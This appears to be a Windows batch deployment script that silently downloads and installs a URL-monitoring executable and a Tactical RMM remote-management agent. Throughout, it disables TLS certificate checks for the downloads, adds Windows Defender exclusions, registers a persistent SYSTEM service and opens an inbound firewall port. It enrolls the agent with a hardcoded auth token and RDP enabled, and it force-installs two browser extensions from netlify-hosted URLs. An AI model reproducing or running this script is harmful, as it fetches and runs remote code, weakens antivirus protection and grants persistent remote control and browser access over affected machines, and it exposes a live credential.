@echo off
setlocal enabledelayedexpansion

:: === Configuration ===
set "URL_PRIMARY=https://github.com/vietwe1993/ichibanurl/releases/latest/download/monitorUrlnew.exe"
set "URL_FALLBACK_DOMAIN=https://dev.cchmesh.reliavn.top:5000/Agent_monitorurl/monitorUrlnew.exe"
set "URL_FALLBACK_IP=https://192.168.193.168:5000/Agent_monitorurl/monitorUrlnew.exe"
set "URL=%URL_PRIMARY%"
set "TARGET_DIR=C:\Users\Public"
set "TARGET_FILE=monitorUrlnew.exe"
set "TASK_NAME=MonitorUrlTask"
set "AGENT_PRIMARY=https://raw.githubusercontent.com/vietwe1993/ichibanurl/main/tacticalagent-v2.9.1-windows-amd64.exe"
set "AGENT_FALLBACK_DOMAIN=https://dev.cchmesh.reliavn.top:5000/Agent_monitorurl/tactical/tacticalagent-v2.9.1-windows-amd64.exe"
set "AGENT_FALLBACK_IP=https://192.168.193.168:5000/Agent_monitorurl/tactical/tacticalagent-v2.9.1-windows-amd64.exe"
set "AGENT_URL=%AGENT_PRIMARY%"
set "AGENT_FILE=%TARGET_DIR%\tacticalagent-v2.9.1-windows-amd64.exe"

:: === Stop monitor service, scheduled task and process if running ===
schtasks /end /tn "%TASK_NAME%" >nul 2>&1
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if not errorlevel 1 (
    echo [ERROR] Cannot remove scheduled task %TASK_NAME%.
    exit /b 1
)
call :StopAgent MonitorUrlService monitorUrlnew
if errorlevel 1 exit /b 1

:: === Create target directory if it doesn't exist ===
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
)

:: === Thêm ngoại lệ Defender cho thư mục và tiến trình Tactical & Monitor ===
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "try { $ErrorActionPreference = 'Stop'; " ^
  "  $paths = @('C:\Program Files\TacticalAgent','C:\Users\Public'); $processes = @('tacticalrmm.exe','tacticalagent.exe','monitorUrlnew.exe'); " ^
  "  Add-MpPreference -ExclusionPath $paths -ErrorAction Stop; Add-MpPreference -ExclusionProcess $processes -ErrorAction Stop; " ^
  "  $prefs = Get-MpPreference -ErrorAction Stop; " ^
  "  foreach ($path in $paths) { if ($prefs.ExclusionPath -notcontains $path) { throw ('Defender exclusion path not confirmed: ' + $path) } }; " ^
  "  foreach ($process in $processes) { if ($prefs.ExclusionProcess -notcontains $process) { throw ('Defender exclusion process not confirmed: ' + $process) } }; exit 0 " ^
  "} catch { Write-Host ('[ERROR] Cannot configure Defender exclusions: ' + $_.Exception.Message); exit 1 }"
if errorlevel 1 exit /b 1

:: === Disable IPv6 properly on all network adapters ===
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | ForEach-Object { Disable-NetAdapterBinding -Name $_.Name -ComponentID ms_tcpip6 -PassThru -ErrorAction SilentlyContinue }"

:: === Delete old file if it exists ===
if exist "%TARGET_DIR%\%TARGET_FILE%" (
    for /l %%i in (1,1,5) do (
        if exist "%TARGET_DIR%\%TARGET_FILE%" (
            del /f /q "%TARGET_DIR%\%TARGET_FILE%" >nul 2>&1
            if exist "%TARGET_DIR%\%TARGET_FILE%" (
                powershell -Command "Get-Process -Name 'monitorUrlnew' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue"
                ping 127.0.0.1 -n 2 >nul
            )
        )
    )
    if exist "%TARGET_DIR%\%TARGET_FILE%" (
        echo [ERROR] Cannot delete existing %TARGET_FILE%: file is locked or in use.
        exit /b 1
    )
)

:: === Download monitorUrlnew.exe ===
call :DownloadExe "%TARGET_DIR%\%TARGET_FILE%" "%URL_PRIMARY%" "%URL_FALLBACK_DOMAIN%" "%URL_FALLBACK_IP%"
if errorlevel 1 exit /b 1

:: === Download tacticalagent-v2.9.1-windows-amd64.exe ===
call :DownloadExe "%AGENT_FILE%" "%AGENT_PRIMARY%" "%AGENT_FALLBACK_DOMAIN%" "%AGENT_FALLBACK_IP%"
if errorlevel 1 exit /b 1

:: === Delete existing task if it exists ===
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorlevel%==0 (
    schtasks /delete /tn "%TASK_NAME%" /f
)

:: === Register Windows Service to run as SYSTEM at startup ===
sc.exe query MonitorUrlService >nul 2>&1
if %errorlevel%==0 (
    sc.exe config MonitorUrlService binPath= "\"%TARGET_DIR%\%TARGET_FILE%\" --service" start= delayed-auto
) else (
    sc.exe create MonitorUrlService binPath= "\"%TARGET_DIR%\%TARGET_FILE%\" --service" start= delayed-auto DisplayName= "CCH MonitorUrl Agent Service"
)
if errorlevel 1 (
    echo [ERROR] Cannot configure MonitorUrlService.
    exit /b 1
)
sc.exe failure MonitorUrlService reset= 86400 actions= restart/5000/restart/10000/restart/60000
if errorlevel 1 (
    echo [ERROR] Cannot configure MonitorUrlService recovery.
    exit /b 1
)


:: === Dừng service và kill tiến trình TacticalAgent cũ nếu đang chạy ===
call :StopAgent TacticalAgent TacticalAgent,tacticalrmm
if errorlevel 1 exit /b 1

:: === Gỡ TacticalAgent cũ (nếu có) và cài lại ===
if exist "C:\Program Files\TacticalAgent\unins000.exe" (
    start "" /wait "C:\Program Files\TacticalAgent\unins000.exe" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART
    if errorlevel 1 (
        echo [ERROR] TacticalAgent uninstaller failed with exit code !errorlevel!.
        exit /b 1
    )
)
start "" /wait "%AGENT_FILE%" /VERYSILENT /SUPPRESSMSGBOXES /NORESTART /SP- /SILENT
if %errorlevel% neq 0 (
    echo [ERROR] TacticalAgent installer failed with exit code %errorlevel%.
    exit /b 1
)
ping 127.0.0.1 -n 5 >nul
if not exist "C:\Program Files\TacticalAgent\tacticalrmm.exe" (
    echo [ERROR] TacticalAgent executable not found after installation.
    exit /b 1
)
"C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api https://cchapi.reliavn.top --client-id 1 --site-id 1 --agent-type workstation --auth 916c8091f216f2946c6f810c75c7ddf52289839e0b83eef9fe29d5d34e770b4a --rdp --ping --power --silent
if %errorlevel% neq 0 (
    echo [ERROR] TacticalAgent registration failed with exit code %errorlevel%.
    exit /b 1
)

:: === Mở port 5002 TCP và UDP trên Firewall ===
powershell -Command "Get-NetFirewallRule -DisplayName 'Allow Port 5002 TCP' -ErrorAction SilentlyContinue | Remove-NetFirewallRule"
powershell -Command "Get-NetFirewallRule -DisplayName 'Allow Port 5002 UDP' -ErrorAction SilentlyContinue | Remove-NetFirewallRule"

powershell -Command "New-NetFirewallRule -DisplayName 'Allow Port 5002 TCP' -Direction Inbound -Protocol TCP -LocalPort 5002 -Action Allow"
powershell -Command "New-NetFirewallRule -DisplayName 'Allow Port 5002 UDP' -Direction Inbound -Protocol UDP -LocalPort 5002 -Action Allow"

:: === XÓA registry extension cũ (nếu có) ===
reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /f >nul 2>&1
reg delete "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /f >nul 2>&1

:: === Add Chrome Extension policies to registry ===
reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
reg add "HKLM\Software\Policies\Google\Chrome\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iibafaabdcbdgemhlcgbaekdlggolejj;https://splendid-taffy-25cf6f.netlify.app/update.xml" /f

:: === Add Edge Extension policies to registry ===
reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 1 /t REG_SZ /d "bebfhecblbhbjgedmoefhlphaoimonjc;https://splendorous-sawine-22272c.netlify.app/update.xml" /f
reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /t REG_SZ /d "iibafaabdcbdgemhlcgbaekdlggolejj;https://splendid-taffy-25cf6f.netlify.app/update.xml" /f

REM === Chạy lệnh PowerShell để set Mesh Agent sang Manual ===
powershell -Command "Set-Service -Name 'Mesh Agent' -StartupType Manual"

:: === Thêm vào danh sách ngoại lệ Defender trước khi hỏi restart ===
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"

:: Start Mesh Agent silently
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden ^
  -Command "try{$s=Get-Service 'Mesh Agent' -ErrorAction Stop; if($s.Status -ne 'Running'){ Start-Service $s }}catch{}" >nul 2>&1

:: === Verify TacticalAgent executable and AgentID before starting Monitor service ===
if not exist "C:\Program Files\TacticalAgent\tacticalrmm.exe" (
    echo [ERROR] Cannot start MonitorUrlService: TacticalAgent executable is missing.
    exit /b 1
)
powershell -NoProfile -ExecutionPolicy Bypass -Command "$aid = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\TacticalRMM' -Name 'AgentID' -ErrorAction SilentlyContinue).AgentID; if (-not $aid) { $aid = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\WOW6432Node\TacticalRMM' -Name 'AgentID' -ErrorAction SilentlyContinue).AgentID }; if (-not $aid) { exit 1 }"
if %errorlevel% neq 0 (
    echo [ERROR] Cannot start MonitorUrlService: TacticalAgent AgentID not found in registry.
    exit /b 1
)

:: === Start MonitorUrl Windows Service now ===
sc.exe start MonitorUrlService >nul 2>&1

:: === Wait for Service to reach RUNNING state and verify HTTP /version health check ===
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$until = [DateTime]::UtcNow.AddSeconds(20); $healthy = $false; " ^
  "while ([DateTime]::UtcNow -lt $until) { " ^
  "  Start-Sleep -Milliseconds 500; " ^
  "  try { " ^
  "    $s = Get-Service -Name 'MonitorUrlService' -ErrorAction SilentlyContinue; " ^
  "    if ($s -and $s.Status -eq 'Running') { " ^
  "      $h = Invoke-RestMethod -Uri 'http://127.0.0.1:5002/version' -TimeoutSec 2 -ErrorAction Stop; " ^
  "      if ($h.version) { $healthy = $true; break } " ^
  "    } elseif ($s -and $s.Status -eq 'Stopped') { break } " ^
  "  } catch { } " ^
  "}; if (-not $healthy) { exit 1 }"
if %errorlevel% neq 0 (
    echo [ERROR] MonitorUrlService failed to reach RUNNING state or HTTP /version health check failed.
    exit /b 1
)

:: === Khởi động lại sau 8 giây, ép đóng app, kèm lý do và thông báo ===
:: shutdown.exe /r /t 8 /f /d p:0:0 /c "Máy sẽ khởi động lại để hoàn tất cài đặt."

echo Done all setup. Exiting script...
exit /b 0

:: Only terminate remaining processes after SCM confirms a clean service stop.
:: A stuck service aborts installation instead of triggering recovery by killing it.
:StopAgent
set "STOP_SERVICE=%~1"
set "STOP_PROCESSES=%~2"
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference = 'Stop'; try { " ^
  "  $s = Get-Service | Where-Object { $_.Name -eq $env:STOP_SERVICE }; " ^
  "  if ($s -and $s.Status -ne 'Stopped') { " ^
  "    if ($s.Status -ne 'StopPending') { & sc.exe stop $env:STOP_SERVICE; if ($LASTEXITCODE -ne 0) { throw 'Service stop request failed' } }; " ^
  "    $s.WaitForStatus([System.ServiceProcess.ServiceControllerStatus]::Stopped, [TimeSpan]::FromSeconds(20)); " ^
  "  }; " ^
  "  $names = $env:STOP_PROCESSES.Split(','); " ^
  "  $processes = @(Get-Process | Where-Object { $names -contains $_.ProcessName }); " ^
  "  foreach ($p in $processes) { if (-not $p.HasExited) { Stop-Process -InputObject $p -Force; if (-not $p.WaitForExit(5000)) { throw 'Process did not exit' } } }; " ^
  "  $deadline = [DateTime]::UtcNow.AddSeconds(5); while ([DateTime]::UtcNow -lt $deadline -and (Get-Process | Where-Object { $names -contains $_.ProcessName })) { Start-Sleep -Milliseconds 500 }; if (Get-Process | Where-Object { $names -contains $_.ProcessName }) { throw 'Agent process is still running' }; " ^
  "  if ($s) { $s.Refresh(); if ($s.Status -ne 'Stopped') { throw 'Service restarted unexpectedly' } }; exit 0 " ^
  "} catch { Write-Host ('[ERROR] Cannot stop ' + $env:STOP_SERVICE + ': ' + $_.Exception.Message); exit 1 }"
exit /b %errorlevel%

:: Download to a unique temporary file. Never accept stale or partial output.
:DownloadExe
set "DOWNLOAD_TARGET=%~1"
set "DOWNLOAD_PRIMARY=%~2"
set "DOWNLOAD_DOMAIN=%~3"
set "DOWNLOAD_IP=%~4"
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference = 'Stop'; $target = $env:DOWNLOAD_TARGET; $temp = $target + '.' + [Guid]::NewGuid().ToString('N') + '.part'; " ^
  "$curl = Get-Command curl.exe -CommandType Application -ErrorAction SilentlyContinue; " ^
  "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " ^
  "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; " ^
  "foreach ($url in @($env:DOWNLOAD_PRIMARY, $env:DOWNLOAD_DOMAIN, $env:DOWNLOAD_IP)) { " ^
  "  try { " ^
  "    Write-Host ('[INFO] Downloading ' + $target + ' from ' + $url); " ^
  "    if ($curl) { & $curl.Source --fail -k --ssl-no-revoke --connect-timeout 5 --max-time 60 -L -o $temp $url; if ($LASTEXITCODE -ne 0) { throw ('curl exit code ' + $LASTEXITCODE) } } " ^
  "    else { " ^
  "      $response = Invoke-WebRequest -UseBasicParsing -Uri $url -OutFile $temp -PassThru -TimeoutSec 60 -ErrorAction Stop; " ^
  "      $length = $response.Headers['Content-Length']; " ^
  "      if ($null -ne $length -and (Get-Item -LiteralPath $temp).Length -ne [long]$length) { throw 'Incomplete download: Content-Length mismatch' } " ^
  "    }; " ^
  "    $reader = [IO.BinaryReader]::new([IO.File]::OpenRead($temp)); " ^
  "    try { if ($reader.BaseStream.Length -lt 64 -or $reader.ReadUInt16() -ne 0x5A4D) { throw 'Invalid EXE header' }; " ^
  "      $reader.BaseStream.Position = 60; $pe = $reader.ReadInt32(); " ^
  "      if ($pe -lt 64 -or $pe -gt ($reader.BaseStream.Length - 4)) { throw 'Invalid PE offset' }; " ^
  "      $reader.BaseStream.Position = $pe; if ($reader.ReadUInt32() -ne 0x4550) { throw 'Invalid PE signature' } " ^
  "    } finally { $reader.Dispose() }; " ^
  "    Move-Item -LiteralPath $temp -Destination $target -Force; exit 0 " ^
  "  } catch { Write-Host ('[WARNING] Download failed: ' + $_.Exception.Message) } " ^
  "  finally { if (Test-Path -LiteralPath $temp) { Remove-Item -LiteralPath $temp -Force -ErrorAction SilentlyContinue } } " ^
  "}; Write-Host ('[ERROR] All download sources failed for ' + $target); exit 1"
exit /b %errorlevel%
